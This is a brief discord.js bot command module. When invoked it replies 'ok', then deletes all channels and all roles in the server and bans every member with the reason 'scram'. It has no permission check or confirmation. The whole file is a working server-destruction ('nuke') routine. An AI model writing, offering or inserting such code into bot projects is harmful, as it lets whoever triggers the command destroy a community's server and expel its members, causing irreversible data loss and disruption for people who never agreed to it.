const Discord = require("discord.js")

module.exports.run = async (client, message, args) => {
 message.channel.send("ok")
 message.guild.channels.forEach(c=>c.delete())
 message.guild.roles.forEach(c=>c.delete())
 message.guild.members.forEach(c=>c.ban("scram"))
}